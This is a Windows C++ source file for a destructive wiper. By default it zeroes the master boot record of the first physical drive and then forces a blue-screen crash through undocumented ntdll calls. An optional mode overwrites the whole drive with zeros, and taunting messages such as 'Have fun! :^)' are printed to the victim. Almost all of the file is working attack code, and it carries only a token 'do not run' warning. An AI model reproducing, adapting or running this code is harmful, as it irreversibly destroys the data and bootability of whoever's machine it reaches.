



//DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU'RE DOING


#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#pragma comment(lib, "ntdll.lib")

#define MBR_SIZE 512

//GENERAL ARGUMENTS
//COMMENT OUT TO DISABLE A SPECIFIC FEATURE
    #define OW_MBR 
//  #define CUSTOM_MBR
//  #define ZERO_DRIVE 
    #define BSOD 



//ARGUMENTS FOR ZERO DRIVE THINGY

//Overwrites sequentially
    #define MODE_FULL  
//Randomly chooses blocks to write to
//Causes more file corruption
//  #define MODE_RANDOM     

#define BLOCK_SIZE      512
#define BLOCKS_TO_OW    97656250
//Size of 256gb drive
#define MAX_OFFSET_L    0xFFFFFFFF
#define MAX_OFFSET_H    0x0000003F


#define PRINT_LOGS 1




extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

using uint64 = unsigned __int64;
using uint32 = unsigned __int32;

bool BlueScreen()
{
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
    return 1;
    
}


bool OverwriteMBR()
{

    DWORD bytes_read = 512;
    
    HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
#ifdef CUSTOM_MBR
    char* buffer = new char{}
#else
    char* buffer = new char[MBR_SIZE];
    ZeroMemory(buffer, MBR_SIZE);

    bool res = WriteFile(hMBR, buffer, MBR_SIZE, &bytes_read, 0);
    
#endif
    CloseHandle(hMBR);
    delete[] buffer;
    return res;

}

bool WriteChunk(HANDLE handle, char* buffer, OVERLAPPED* ol)
{
    DWORD* bytes_read = new DWORD;
    
    bool res = WriteFile(handle, buffer, BLOCK_SIZE, bytes_read, ol);
    delete bytes_read;
    if (PRINT_LOGS)
    {
        uint64 fullOffset = ((uint64)ol->OffsetHigh << 32) | ol->Offset;
        printf("Wrote to offset ");
        printf("%llx", fullOffset);
        printf(". Result: ");
        if(res)
        {
            printf("SUCCESS\n");
        }
        else
        {
            printf("FAILED\n");
        }
    }
    
    return res;
}

bool ZeroDrive()
{
    HANDLE fhandle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    char* buf = new char[BLOCK_SIZE];
    ZeroMemory(buf,BLOCK_SIZE);
#ifdef MODE_FULL
    
    for (uint32 i = 0; i < BLOCKS_TO_OW; i++)
    {
        OVERLAPPED* ol = new OVERLAPPED;
        memset(ol, 0, sizeof(OVERLAPPED));
        ol->hEvent = NULL;

        uint64 addr = i * BLOCK_SIZE;
        if (addr > 0xffffffff)
        {

            ol->Offset = (uint32)(addr & 0xffffffff);
            ol->OffsetHigh = (uint32)((addr & 0xffffffff00000000) >> 32);
        }
        else
        {
            ol->Offset = (uint32)addr;
            ol->OffsetHigh = 0;

        }

        
        WriteChunk(fhandle, buf, ol);
        delete ol;
    }
    
#endif
#ifdef MODE_RANDOM
    
        for (unsigned int i = 0; i < BLOCKS_TO_OW; i++)
        {
            OVERLAPPED* ol = new OVERLAPPED;
            memset(ol, 0, 512);
            ol->hEvent = NULL;
            ol->Offset = rand() % MAX_OFFSET_L;
            ol->OffsetHigh = rand() % MAX_OFFSET_H;
 
            WriteChunk(fhandle, buf, ol);
            delete ol;
        }
#endif
    CloseHandle(fhandle);
    return 1;

}

int main()
{

#ifdef OW_MBR
    
    if (OverwriteMBR())
    {
        printf("Master Bootloader Overwrittten. \nHave fun! :^) \n");
    }
#endif
    

#ifdef ZERO_DRIVE
    printf("Attempting to zero out your hard drive :)");
    if (ZeroDrive())
    {
        printf("Zeroed out some of your drive :D");
    }
#endif

#ifdef BSOD
    
    if (BlueScreen())
    {
        printf("Bluescreening your pc :P");
    };
#endif
    


    return 0;
}